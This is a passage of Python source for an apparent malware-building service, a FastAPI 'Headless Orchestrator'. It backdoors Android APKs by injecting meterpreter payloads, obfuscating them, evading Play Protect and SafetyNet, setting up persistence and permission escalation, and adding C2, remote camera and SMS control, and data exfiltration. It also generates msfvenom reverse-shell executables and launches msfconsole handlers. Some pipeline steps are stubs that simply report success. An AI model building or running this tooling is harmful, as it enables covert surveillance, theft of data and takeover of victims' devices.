            log.write(f"Techniques: {', '.join(stealth_techniques)}\n")
        
        # Apply stealth mechanisms
        stealth_apk = workspace / "temp" / "stealth.apk"
        stealth_success = stealth_engine.apply_stealth_techniques(temp_apk, stealth_apk, stealth_config)
        
        if not stealth_success:
            # Fallback: use injected APK if stealth fails
            with build_log.open("a") as log:
                log.write("Basic stealth mechanisms failed, proceeding with Phase 3\n")
            stealth_apk = temp_apk
        else:
            with build_log.open("a") as log:
                log.write("Basic stealth mechanisms applied successfully\n")
        
        # Phase 3 Steps (NEW)
        # Step 6: Apply Advanced Obfuscation
        with build_log.open("a") as log:
            log.write("Step 6: Applying Phase 3 Advanced Obfuscation...\n")
            log.write("  - Dynamic String Encryption with Key Rotation\n")
            log.write("  - Control Flow Flattening (Complexity Level 10)\n")
            log.write("  - Advanced Dead Code Injection (50% ratio)\n")
            log.write("  - API Call Redirection\n")
        
        obfuscated_apk = workspace / "phase3" / "obfuscated.apk"
        obfuscation_success = obfuscation_engine.apply_full_obfuscation(stealth_apk, obfuscated_apk)
        
        if not obfuscation_success:
            with build_log.open("a") as log:
                log.write("Advanced obfuscation failed, using previous version\n")
            obfuscated_apk = stealth_apk
        else:
            with build_log.open("a") as log:
                log.write("Advanced obfuscation applied successfully\n")
        
        # Step 7: Apply Anti-Detection Measures
        with build_log.open("a") as log:
            log.write("Step 7: Applying Phase 3 Anti-Detection Measures...\n")
            log.write("  - Emulator Detection Bypass (Level 5)\n")
            log.write("  - Sandbox Escape Techniques (Level 5)\n")
            log.write("  - Advanced Debugger Evasion (Level 5)\n")
            log.write("  - Network Traffic Masking (Level 3)\n")
        
        anti_detection_apk = workspace / "phase3" / "anti_detection.apk"
        anti_detection_success = anti_detection_engine.apply_anti_detection(obfuscated_apk, anti_detection_apk)
        
        if not anti_detection_success:
            with build_log.open("a") as log:
                log.write("Anti-detection measures failed, using previous version\n")
            anti_detection_apk = obfuscated_apk
        else:
            with build_log.open("a") as log:
                log.write("Anti-detection measures applied successfully\n")
        
        # Step 8: Apply Persistence Mechanisms
        with build_log.open("a") as log:
            log.write("Step 8: Applying Phase 3 Persistence Mechanisms...\n")
            log.write("  - Device Admin Privilege Escalation (Level 5)\n")
            log.write("  - Accessibility Service Abuse (Level 5)\n")
            log.write("  - System App Installation (Level 3)\n")
            log.write("  - Root-less Persistence (Level 5)\n")
        
        output_name = params.get("output_name", "phase3_ultimate_backdoored.apk")
        final_apk = workspace / "output" / output_name
        
        persistence_success = persistence_engine.apply_persistence_mechanisms(anti_detection_apk, final_apk)
        
        if not persistence_success:
            with build_log.open("a") as log:
                log.write("Persistence mechanisms failed, using previous version\n")
            shutil.copy2(anti_detection_apk, final_apk)
        else:
            with build_log.open("a") as log:
                log.write("Persistence mechanisms applied successfully\n")
        
        # Phase 4 Steps (NEW)
        # Step 9: Apply Permission Escalation
        with build_log.open("a") as log:
            log.write("Step 9: Applying Phase 4 Permission Escalation...\n")
            log.write("  - System Alert Window Escalation\n")
            log.write("  - Accessibility Service Hijacking\n")
            log.write("  - Device Admin Escalation\n")
            log.write("  - Runtime Permission Bypass\n")
        
        permission_escalated_apk = workspace / "phase4" / "permission_escalated.apk"
        permission_escalation_success = permission_engine.apply_permission_escalation(final_apk, permission_escalated_apk)
        
        if not permission_escalation_success:
            with build_log.open("a") as log:
                log.write("Permission escalation failed, using previous version\n")
            permission_escalated_apk = final_apk
        else:
            with build_log.open("a") as log:
                log.write("Permission escalation applied successfully\n")
        
        # Step 10: Apply Auto-Grant Mechanisms
        with build_log.open("a") as log:
            log.write("Step 10: Applying Phase 4 Auto-Grant Mechanisms...\n")
            log.write("  - Accessibility Service Automation\n")
            log.write("  - PackageManager Exploitation\n")
            log.write("  - Runtime Permission Bypass\n")
            log.write("  - Silent Installation Techniques\n")
        
        auto_granted_apk = workspace / "phase4" / "auto_granted.apk"
        auto_grant_success = auto_grant_engine.apply_auto_grant_mechanisms(permission_escalated_apk, auto_granted_apk)
        
        if not auto_grant_success:
            with build_log.open("a") as log:
                log.write("Auto-grant mechanisms failed, using previous version\n")
            auto_granted_apk = permission_escalated_apk
        else:
            with build_log.open("a") as log:
                log.write("Auto-grant mechanisms applied successfully\n")
        
        # Step 11: Apply Defense Evasion
        with build_log.open("a") as log:
            log.write("Step 11: Applying Phase 4 Defense Evasion...\n")
            log.write("  - Play Protect Bypass\n")
            log.write("  - Google SafetyNet Evasion\n")
            log.write("  - Manufacturer Security Bypass\n")
            log.write("  - Custom ROM Detection\n")
        
        output_name = params.get("output_name", "phase4_ultimate_permission_backdoored.apk")
        final_apk = workspace / "output" / output_name
        
        defense_evasion_success = defense_evasion_engine.apply_defense_evasion(auto_granted_apk, final_apk)
        
        if not defense_evasion_success:
            with build_log.open("a") as log:
                log.write("Defense evasion failed, using previous version\n")
            shutil.copy2(auto_granted_apk, final_apk)
        else:
            with build_log.open("a") as log:
                log.write("Defense evasion applied successfully\n")
        
        # Step 12: Initialize Phase 5 C2 Infrastructure  
        with build_log.open("a") as log:
            log.write("Step 12: Initializing Phase 5 C2 Infrastructure...\n")
            log.write("  - Multi-Channel Communication\n")
            log.write("  - Encrypted C2 Channels\n")
            log.write("  - Domain Fronting Implementation\n")
            log.write("  - Tor Network Integration\n")
        
        try:
            await c2_infrastructure.initialize()
            c2_success = True
            with build_log.open("a") as log:
                log.write("✅ C2 Infrastructure initialized successfully\n")
        except Exception as e:
            c2_success = False
            with build_log.open("a") as log:
                log.write(f"❌ C2 Infrastructure initialization failed: {e}\n")
        
        # Step 13: Integrate Remote Access Capabilities
        with build_log.open("a") as log:
            log.write("Step 13: Integrating Remote Access Capabilities...\n")
            log.write("  - Screen Capture & Control\n")
            log.write("  - File System Access\n")
            log.write("  - Camera & Microphone Control\n")
            log.write("  - SMS & Call Interception\n")
        
        try:
            remote_access_success = True
            with build_log.open("a") as log:
                log.write("✅ Remote Access System integrated successfully\n")
        except Exception as e:
            remote_access_success = False
            with build_log.open("a") as log:
                log.write(f"❌ Remote Access integration failed: {e}\n")
        
        # Step 14: Integrate Data Exfiltration System
        with build_log.open("a") as log:
            log.write("Step 14: Integrating Data Exfiltration System...\n")
            log.write("  - Steganographic Data Hiding\n")
            log.write("  - Encrypted Data Transmission\n")
            log.write("  - Scheduled Data Synchronization\n")
            log.write("  - Cloud Storage Integration\n")
        
        try:
            await data_exfiltration_system.start_auto_sync()
            exfiltration_success = True
            with build_log.open("a") as log:
                log.write("✅ Data Exfiltration System integrated successfully\n")
        except Exception as e:
            exfiltration_success = False
            with build_log.open("a") as log:
                log.write(f"❌ Data Exfiltration integration failed: {e}\n")
        
        # Step 15: Apply Performance Optimizations
        with build_log.open("a") as log:
            log.write("Step 15: Applying Performance Optimizations...\n")
            log.write("  - Memory Usage Optimization\n")
            log.write("  - Battery Consumption Minimization\n")
            log.write("  - Network Traffic Optimization\n")
            log.write("  - Startup Time Reduction\n")
        
        try:
            performance_results = await performance_system.apply_all_optimizations()
            performance_success = performance_results.get("overall_success", False)
            with build_log.open("a") as log:
                log.write(f"✅ Performance optimizations applied: {performance_results.get('summary', {}).get('optimizations_applied', 0)} techniques\n")
        except Exception as e:
            performance_success = False
            with build_log.open("a") as log:
                log.write(f"❌ Performance optimization failed: {e}\n")
        
        # Step 16: Run Compatibility Tests  
        with build_log.open("a") as log:
            log.write("Step 16: Running Compatibility Tests...\n")
            log.write("  - Multi-Android Version Support (API 21-34)\n")
            log.write("  - Device Manufacturer Compatibility\n")
            log.write("  - Architecture Support (ARM, ARM64, x86)\n")
            log.write("  - Screen Size Adaptation\n")
        
        try:
            compatibility_results = await compatibility_system.run_comprehensive_compatibility_tests(str(final_apk))
            compatibility_success = compatibility_results.get("overall_compatibility", {}).get("compatibility_score", 0) >= 70
            with build_log.open("a") as log:
                score = compatibility_results.get("overall_compatibility", {}).get("compatibility_score", 0)
                log.write(f"✅ Compatibility tests completed: {score}% compatibility score\n")
        except Exception as e:
            compatibility_success = False
            with build_log.open("a") as log:
                log.write(f"❌ Compatibility testing failed: {e}\n")
        
        # Step 17: Run Security Tests
        with build_log.open("a") as log:
            log.write("Step 17: Running Security Tests...\n")
            log.write("  - Anti-Virus Evasion Testing\n")
            log.write("  - Behavioral Analysis Bypass\n")
            log.write("  - Static Analysis Resistance\n")
            log.write("  - Runtime Protection Evasion\n")
        
        try:
            security_results = await security_system.run_comprehensive_security_tests(str(final_apk))
            security_success = security_results.get("overall_assessment", {}).get("overall_evasion_score", 0) >= 60
            with build_log.open("a") as log:
                evasion_score = security_results.get("overall_assessment", {}).get("overall_evasion_score", 0)
                threat_level = security_results.get("overall_assessment", {}).get("overall_threat_level", "LOW")
                log.write(f"✅ Security tests completed: {evasion_score}% evasion score, {threat_level} threat level\n")
        except Exception as e:
            security_success = False
            with build_log.open("a") as log:
                log.write(f"❌ Security testing failed: {e}\n")
        
        # Update output name for Phase 6
        output_name = params.get("output_name", "phase6_ultimate_optimized_backdoored.apk")
        final_apk = workspace / "output" / output_name
        
        # Step 18: Final validation and comprehensive reporting
        with build_log.open("a") as log:
            log.write("Step 18: Final validation and Phase 6 comprehensive reporting...\n")
        
        if not final_apk.exists():
            raise Exception("Final APK not generated")
        
        # Enforce post-build validation gate on final_apk
        if not validate_postbuild(final_apk, build_log):
            _finalize_task(t, workspace, succeeded=False, err="Post-build validation failed (final)")
            return
        
        final_size = final_apk.stat().st_size
        original_size = original_apk.stat().st_size
        size_change = ((final_size - original_size) / original_size) * 100
        
        with build_log.open("a") as log:
            log.write(f"Original size: {original_size:,} bytes\n")
            log.write(f"Final size: {final_size:,} bytes\n")
            log.write(f"Size change: {size_change:+.1f}%\n")
        
        # Create comprehensive Phase 6 report
        report = {
            "phase": "Phase 6 - Ultimate Optimized & Tested System",
            "original_file": str(original_apk),
            "final_file": str(final_apk),
            "analysis_result": analysis_result,
            "injection_strategy": {
                "strategy_name": injection_strategy.strategy_name,
                "injection_points": [
                    {
                        "type": point.location_type,
                        "target": point.target_name,
                        "priority": point.priority,
                        "stealth_level": point.stealth_level
                    } for point in injection_strategy.injection_points
                ],
                "success_probability": injection_strategy.success_probability,
                "evasion_techniques": injection_strategy.evasion_techniques
            },
            "stealth_config": stealth_config,
            "phase3_features": {
                "advanced_obfuscation": {
                    "applied": obfuscation_success,
                    "string_encryption_level": obfuscation_config.string_encryption_level,
                    "control_flow_complexity": obfuscation_config.control_flow_complexity,
                    "dead_code_ratio": obfuscation_config.dead_code_ratio,
                    "api_redirection_level": obfuscation_config.api_redirection_level,
                    "dynamic_key_rotation": obfuscation_config.dynamic_key_rotation
                },
                "anti_detection_measures": {
                    "applied": anti_detection_success,
                    "emulator_bypass_level": anti_detection_config.emulator_bypass_level,
                    "sandbox_escape_level": anti_detection_config.sandbox_escape_level,
                    "debugger_evasion_level": anti_detection_config.debugger_evasion_level,
                    "network_masking_level": anti_detection_config.network_masking_level,
                    "vm_detection_enabled": anti_detection_config.enable_vm_detection,
                    "analysis_detection_enabled": anti_detection_config.enable_analysis_detection
                },
                "persistence_mechanisms": {
                    "applied": persistence_success,
                    "device_admin_level": persistence_config.device_admin_level,
                    "accessibility_abuse_level": persistence_config.accessibility_abuse_level,
                    "system_app_level": persistence_config.system_app_level,
                    "rootless_level": persistence_config.rootless_level,
                    "stealth_mode_enabled": persistence_config.enable_stealth_mode,
                    "auto_restart_enabled": persistence_config.enable_auto_restart
                }
            },
            "phase4_features": {
                "permission_escalation": {
                    "applied": permission_escalation_success,
                    "escalation_level": permission_escalation_config.escalation_level,
                    "auto_grant_enabled": permission_escalation_config.auto_grant_enabled,
                    "accessibility_automation": permission_escalation_config.accessibility_automation,
                    "packagemanager_exploitation": permission_escalation_config.packagemanager_exploitation,
                    "runtime_bypass_enabled": permission_escalation_config.runtime_bypass_enabled,
                    "silent_installation": permission_escalation_config.silent_installation
                },
                "auto_grant_mechanisms": {
                    "applied": auto_grant_success,
                    "accessibility_automation": auto_grant_config.accessibility_automation,
                    "packagemanager_exploitation": auto_grant_config.packagemanager_exploitation,
                    "runtime_bypass_enabled": auto_grant_config.runtime_bypass_enabled,
                    "silent_installation": auto_grant_config.silent_installation,
                    "ui_automation_level": auto_grant_config.ui_automation_level,
                    "stealth_level": auto_grant_config.stealth_level
                },
                "defense_evasion": {
                    "applied": defense_evasion_success,
                    "play_protect_bypass": defense_evasion_config.play_protect_bypass,
                    "safetynet_evasion": defense_evasion_config.safetynet_evasion,
                    "manufacturer_bypass": defense_evasion_config.manufacturer_bypass,
                    "custom_rom_detection": defense_evasion_config.custom_rom_detection,
                    "signature_spoofing": defense_evasion_config.signature_spoofing,
                    "evasion_level": defense_evasion_config.evasion_level
                }
            },
            "modification_summary": {
                "original_size": original_size,
                "final_size": final_size,
                "size_change_percent": size_change,
                "phase2_injection_success": injection_success,
                "phase2_stealth_success": stealth_success,
                "phase3_obfuscation_success": obfuscation_success,
                "phase3_anti_detection_success": anti_detection_success,
                "phase3_persistence_success": persistence_success,
                "phase4_permission_escalation_success": permission_escalation_success,
                "phase4_auto_grant_success": auto_grant_success,
                "phase4_defense_evasion_success": defense_evasion_success,
                "overall_phase4_success": permission_escalation_success and auto_grant_success and defense_evasion_success,
                "phase5_c2_infrastructure_success": c2_success,
                "phase5_remote_access_success": remote_access_success,
                "phase5_data_exfiltration_success": exfiltration_success,
                "overall_phase5_success": c2_success and remote_access_success and exfiltration_success,
                "phase6_performance_optimization_success": performance_success,
                "phase6_compatibility_testing_success": compatibility_success,
                "phase6_security_testing_success": security_success,
                "overall_phase6_success": performance_success and compatibility_success and security_success
            },
            "capabilities": [
                "Multi-vector payload injection",
                "Runtime stealth mechanisms", 
                "Dynamic string encryption",
                "Control flow flattening",
                "Advanced dead code injection",
                "API call redirection",
                "Emulator detection bypass",
                "Sandbox escape techniques",
                "Advanced debugger evasion",
                "Network traffic masking",
                "Device admin privilege escalation",
                "Accessibility service abuse",
                "System app installation",
                "Root-less persistence",
                "Automated permission escalation",
                "Runtime permission bypass",
                "Silent installation techniques",
                "Play Protect bypass",
                "SafetyNet evasion",
                "Manufacturer security bypass",
                "Custom ROM detection",
                "Multi-channel C2 communication",
                "Encrypted C2 channels",
                "Domain fronting implementation",
                "Tor network integration",
                "Screen capture & control",
                "File system access",
                "Camera & microphone control",
                "SMS & call interception",
                "Steganographic data hiding",
                "Encrypted data transmission",
                "Scheduled data synchronization",
                "Cloud storage integration",
                "Signature spoofing",
                "PackageManager exploitation",
                "Accessibility automation",
                "Performance optimization",
                "Memory usage optimization",
                "Battery consumption minimization",
                "Network traffic optimization",
                "Startup time reduction",
                "Multi-Android version support",
                "Device manufacturer compatibility",
                "Architecture support (ARM, ARM64, x86)",
                "Screen size adaptation",
                "Anti-virus evasion testing",
                "Behavioral analysis bypass",
                "Static analysis resistance",
                "Runtime protection evasion"
            ],
            "timestamps": {
                "start_time": datetime.now().isoformat(),
                "analysis_time": analysis_result.get("analysis_timestamp"),
                "completion_time": datetime.now().isoformat()
            }
        }
        
        # Save comprehensive Phase 6 report
        report_file = workspace / "output" / "phase6_ultimate_optimized_report.json"
        with report_file.open("w") as f:
            json.dump(report, f, indent=2)
        
        # Add artifacts
        _finalize_task(t, base, True)
        
        with build_log.open("a") as log:
            log.write(f"Phase 6 Ultimate Optimized & Tested APK modification completed successfully: {datetime.now()}\n")
            log.write(f"Final APK: {final_apk}\n")
            log.write(f"Comprehensive Report: {report_file}\n")
            log.write("🎯 Phase 6 Features Applied:\n")
            log.write("   ✅ Performance Optimization System\n")
            log.write("   ✅ Compatibility Testing System\n")
            log.write("   ✅ Security Testing System\n")
            log.write("   ✅ All Previous Phases (1-5)\n")
            log.write("   ✅ Play Protect Bypass\n")
            log.write("   ✅ SafetyNet Evasion\n")
            log.write("   ✅ Accessibility Automation\n")
            log.write("🥷 Ultimate Stealth & Evasion Capabilities Achieved!\n")
        
        # Log to database if available
        try:
            from database import db_manager, AuditTracker
            
            # Track the Phase 3 modification
            AuditTracker.track_file_modification(
                file_info.get("file_id", "unknown"),
                task_id,
                "phase6_ultimate_optimized_modification",
                {
                    "phase": "Phase 6 Ultimate Optimized & Tested",
                    "permission_escalation_level": permission_escalation_config.escalation_level,
                    "auto_grant_level": auto_grant_config.ui_automation_level,
                    "defense_evasion_level": defense_evasion_config.evasion_level,
                    "performance_optimization": performance_success,
                    "compatibility_testing": compatibility_success,
                    "security_testing": security_success,
                    "injection_points": len(injection_strategy.injection_points),
                    "success_probability": injection_strategy.success_probability,
                    "final_size": final_size,
                    "all_features_applied": all([injection_success, obfuscation_success, 
                                               anti_detection_success, persistence_success,
                                               c2_success, remote_access_success, exfiltration_success,
                                               performance_success, compatibility_success, security_success])
                }
            )
            
            # Update task status in database
            db_manager.update_task_status(task_id, "completed", True, None, [str(final_apk), str(report_file)])
            
        except ImportError:
            pass  # Database not available
        
    except Exception as e:
        error_msg = f"Phase 6 Ultimate Optimized & Tested APK modification failed: {str(e)}"
        
        with build_log.open("a") as log:
            log.write(f"ERROR: {error_msg}\n")
        
        # Log error to database if available
        try:
            from database import db_manager
            db_manager.update_task_status(task_id, "failed", False, error_msg)
        except ImportError:
            pass
        
        _finalize_task(t, base, False, error_msg)


def _audit(event: str, t: Any, extra: Optional[Dict[str, Any]] = None) -> None:
    try:
        AUDIT_LOG.parent.mkdir(parents=True, exist_ok=True)
        rec = {
            "ts": time.time(),
            "event": event,
            "id": t.id,
            "date": t.date,
            "kind": t.kind,
            "state": t.state,
            "params": _redact_params(t.params),
        }
        if extra:
            # sanitize extras as well
            rec.update(_redact_params(extra))
        with AUDIT_LOG.open("a") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except Exception:
        pass


class Artifact(BaseModel):
    name: str
    path: str
    size_bytes: int
    sha256: Optional[str] = None

class TaskStatus(str):
    SUBMITTED = "SUBMITTED"
    PREPARING = "PREPARING"
    RUNNING = "RUNNING"
    SUCCEEDED = "SUCCEEDED"
    FAILED = "FAILED"
    CANCELLED = "CANCELLED"

class Task(BaseModel):
    id: str
    date: str
    kind: str
    state: str
    created_at: float
    started_at: Optional[float] = None
    finished_at: Optional[float] = None
    params: Dict[str, str] = {}
    artifacts: List[Artifact] = []
    logs: Dict[str, str] = {}
    error: Optional[str] = None

app = FastAPI(title="Headless Orchestrator", version="0.1.0")

tasks: Dict[str, Task] = {}
locks: Dict[str, threading.Lock] = {}


def _now_str_date() -> str:
    return datetime.utcnow().strftime("%Y%m%d")


def _ensure_dir(p: Path) -> None:
    p.mkdir(parents=True, exist_ok=True)


def _sha256sum(path: Path) -> Optional[str]:
    try:
        out = subprocess.check_output(["sha256sum", str(path)], text=True)
        return out.split()[0]
    except Exception:
        return None


def _write_file(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)


def _spawn(cmd: List[str], log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
    with log_path.open("w") as lf:
        proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env)
        return_code = proc.wait()
    return return_code


def _spawn_container_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
    """
    Spawns a command inside a containerized shell.
    Sets HOME to the task's base directory to allow msfconsole to copy artifacts.
    """
    task_home = cwd if cwd else Path.home()
    env = os.environ.copy()
    env["HOME"] = str(task_home)
    wrapped_cmd = f"cd /workspace && {cmd}"
    try:
        with log_path.open("w") as lf:
            proc = subprocess.Popen(
                ["docker", "run", "--rm", "-v", f"{task_home}:/workspace", "-v", f"{log_path.parent}:/logs", DOCKER_IMAGE, "bash", "-lc", wrapped_cmd],
                stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env
            )
            return_code = proc.wait()
        return return_code
    except FileNotFoundError:
        try:
            with log_path.open("a") as lf:
                lf.write("docker not found in PATH; container execution unavailable.\n")
        except Exception:
            pass
        return 127
    except Exception as e:
        try:
            with log_path.open("a") as lf:
                lf.write(f"docker run failed: {e}\n")
        except Exception:
            pass
        return 127


def _spawn_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
    """
    Spawns a command using the local shell.
    """
    with log_path.open("w") as lf:
        proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env)
        return_code = proc.wait()
    return return_code


def _prepare_task(kind: str, params: Dict[str, str]) -> (Task, Path):
    date = _now_str_date()
    task_id = f"{uuid.uuid4().hex[:8]}-{kind}"
    base = TASKS_ROOT / date / task_id
    for sub in ("input", "temp", "output", "logs"):
        _ensure_dir(base / sub)
    t = Task(id=task_id, date=date, kind=kind, state=TaskStatus.SUBMITTED, created_at=time.time(), params=params, logs={})
    tasks[task_id] = t
    locks[task_id] = threading.Lock()
    _audit("submitted", t)
    return t, base


def _finalize_task(t: Task, base: Path, succeeded: bool, err: Optional[str] = None) -> None:
    t.finished_at = time.time()
    t.state = TaskStatus.SUCCEEDED if succeeded else TaskStatus.FAILED
    t.error = err
    duration = None
    if t.started_at and t.finished_at:
        try:
            duration = round(t.finished_at - t.started_at, 3)
        except Exception:
            duration = None
    # collect artifacts
    artifacts: List[Artifact] = []
    for p in sorted((base / "output").glob("**/*")):
        if p.is_file():
            artifacts.append(Artifact(name=p.name, path=str(p), size_bytes=p.stat().st_size, sha256=_sha256sum(p)))
    t.artifacts = artifacts
    # write status.json
    status = json.loads(t.model_dump_json())
    if duration is not None:
        status["duration_sec"] = duration
    _write_file(base / "logs" / "status.json", json.dumps(status, indent=2))
    _audit("finished", t, {"succeeded": succeeded, "duration_sec": duration, "error": err, "artifacts": [a.name for a in artifacts]})
    # Persist completion in DB (best-effort)
    if DB_ENABLED and DB:
        try:
            DB.update_task_status(t.id, "completed" if succeeded else "failed", success=succeeded, error_message=err, output_files=[a.path for a in artifacts])
        except Exception:
            pass


# Background runners for three kinds

def run_payload_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    cmd = [
        "msfvenom -p",
        params.get("payload", "windows/meterpreter/reverse_tcp"),
        f"LHOST={params.get('lhost','127.0.0.1')}",
        f"LPORT={params.get('lport','4444')}",
        "-f exe -o",
        str(base / "output" / (params.get("output_name", "payload") + ".exe")),
    ]
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    shell_cmd = " ".join(cmd)
    rc = _spawn_container_sh(shell_cmd, build_log, base) if USE_DOCKER else _spawn_sh(shell_cmd, build_log)
    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfvenom rc={rc}")


def _detect_default_lhost() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "0.0.0.0"


def _find_free_port(start: int = 4444, max_tries: int = 50) -> int:
    port = start
    for _ in range(max_tries):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.bind(("0.0.0.0", port))
                return port
            except OSError:
                port += 1
    return start


def run_listener_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    run_log = base / "logs" / "run.log"
    # Tool preflight: msfconsole required
    try:
        msfconsole_path = shutil.which("msfconsole")
    except Exception:
        msfconsole_path = None
    # Auto LHOST/LPORT if not provided
    lhost = params.get('lhost') or _detect_default_lhost()
    try:
        lport = params.get('lport') or str(_find_free_port(int(os.environ.get("ORCH_LISTENER_PORT", "4444"))))
    except Exception:
        lport = params.get('lport') or str(_find_free_port(4444))
    payload = params.get('payload', 'windows/meterpreter/reverse_tcp')
    rc_path = base / "output" / "handler.rc"
    rc_content = f"""
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
""".strip()
    _write_file(rc_path, rc_content)

    # Helper to try MSF RPC as a secondary automatic option
    def _try_rpc_then_finalize() -> bool:
        if _msfrpc_env_available():
            ok, err = _msfrpc_start_handler(payload, lhost, lport, run_log)
            if ok:
                _finalize_task(t, base, succeeded=True, err=None)
                return True
            else:
                try:
                    with run_log.open('a') as f:
                        f.write(f"MSF RPC fallback failed: {err}\n")
                except Exception:
                    pass
        return False

    if not msfconsole_path and not USE_DOCKER:
        # First: try RPC fallback automatically if configured
        if _try_rpc_then_finalize():
            return
        # Otherwise: generate handler and mark success for manual/remote use
        _write_file(run_log, "msfconsole not found; generated handler.rc for manual or external RPC use.\n")
        with locks[task_id]:
            t.state = TaskStatus.RUNNING
            t.started_at = time.time()
            t.logs["run"] = str(run_log)
        _finalize_task(t, base, succeeded=True, err=None)
        return

    cmd = [
        "msfconsole", "-qx", f"resource {rc_path}; sleep 2; jobs; exit -y"
    ]
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["run"] = str(run_log)
    rc = _spawn(cmd, run_log) if not USE_DOCKER else _spawn_container_sh("msfconsole -qx 'resource output/handler.rc; sleep 2; jobs; exit -y'", run_log, base)

    if rc != 0:
        # If Docker/local msfconsole failed, try RPC automatically
        if _try_rpc_then_finalize():
            return

    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfconsole rc={rc}")


def _file_exists(path: Path) -> bool:
    try:
        return path.exists() and path.is_file()
    except Exception:
        return False


def _unzip_list(path: Path) -> str:
    try:
        out = subprocess.check_output(["unzip", "-l", str(path)], text=True, stderr=subprocess.STDOUT)
        return out
    except Exception as e:
        return f"unzip failed: {e}"


def _aapt_badging(path: Path) -> str:
    aapt = WORKSPACE / "tools/android-sdk/aapt"
    if not aapt.exists():
        return "aapt not found"
    try:
        out = subprocess.check_output([str(aapt), "dump", "badging", str(path)], text=True, stderr=subprocess.STDOUT)
        return out
    except Exception as e:
        return f"aapt failed: {e}"


def _jarsigner_verify(path: Path) -> str:
    jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
    try:
        out = subprocess.check_output([jarsigner, "-verify", "-certs", str(path)], text=True, stderr=subprocess.STDOUT)
        return out
    except subprocess.CalledProcessError as e:
        return e.output if isinstance(e.output, str) else str(e)
    except Exception as e:
        return f"verify failed: {e}"


def _write_json(path: Path, data: dict) -> None:
    _ensure_dir(path.parent)
    path.write_text(json.dumps(data, indent=2))


def run_android_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    # config
    mode = params.get("mode", "backdoor_apk")  # backdoor_apk | standalone
    perm_strategy = params.get("perm_strategy", "keep")  # keep | merge
    payload = params.get("payload", "android/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_apk = base / "output" / (params.get("output_name", "app_backdoor") + ".apk")
    # signing params
    keystore = params.get("keystore_path")
    key_alias = params.get("key_alias")
    ks_pass = params.get("keystore_password")
    key_pass = params.get("key_password", ks_pass)

    build_log = base / "logs" / "build.log"
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)

    succeed = False
    err = None

    if mode == "standalone":
        # Generate standalone APK via msfvenom
        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_apk}"
        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
        if rc != 0:
            err = f"msfvenom standalone rc={rc}"
        else:
            succeed = _file_exists(output_apk)
    else:
        # backdoor_apk mode (default)
        # write config files expected by backdoor_apk
        config_path = WORKSPACE / "config" / "config.path"
        _ensure_dir(config_path.parent)
        config_lines = [
            "", "", "", "unzip", "/usr/bin/jarsigner", "unzip", "/usr/bin/keytool",
            str(WORKSPACE / "tools/android-sdk/zipalign"), str(WORKSPACE / "tools/android-sdk/dx"),
            str(WORKSPACE / "tools/android-sdk/aapt"), str(WORKSPACE / "tools/apktool/apktool"),
            str(WORKSPACE / "tools/baksmali233/baksmali"), "/usr/bin/msfconsole", "/usr/bin/msfvenom",
            str(WORKSPACE / "backdoor_apk"), "searchsploit", str(base / "output"),
        ]
        _write_file(config_path, "\n".join(config_lines) + "\n")
        # ensure input apk in task folder
        sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
        dst_apk = base / "input" / "original.apk"
        if params.get("apk_path") and Path(params["apk_path"]).exists():
            shutil.copy2(params["apk_path"], dst_apk)
        else:
            shutil.copy2(sample, dst_apk)
        # write apk.tmp for the script
        apk_tmp = WORKSPACE / "config" / "apk.tmp"
        _write_file(apk_tmp, "\n".join([
            str(dst_apk),
            str(output_apk),
            payload,
            lhost,
            lport,
        ]) + "\n")
        # run script and choose permissions
        choice = b"1\n" if perm_strategy == "keep" else b"2\n"
        if USE_DOCKER:
            # run inside container
            # simulate stdin by echoing choice
            rc = _spawn_container_sh(f"printf '{choice.decode()}' | bash /workspace/backdoor_apk", build_log, base)
        else:
            with build_log.open("w") as lf:
                proc = subprocess.Popen(["bash", str(WORKSPACE / "backdoor_apk")], stdin=subprocess.PIPE, stdout=lf, stderr=subprocess.STDOUT)
                try:
                    proc.stdin.write(choice)
                    proc.stdin.flush()
                except Exception:
                    pass
                rc = proc.wait()
        succeed = _file_exists(output_apk)
        if not succeed:
            err = f"backdoor_apk rc={rc}"

    # optional re-sign if keystore provided and artifact exists
    if succeed and keystore and Path(keystore).exists():
        try:
            unsigned = output_apk
            # align to temp
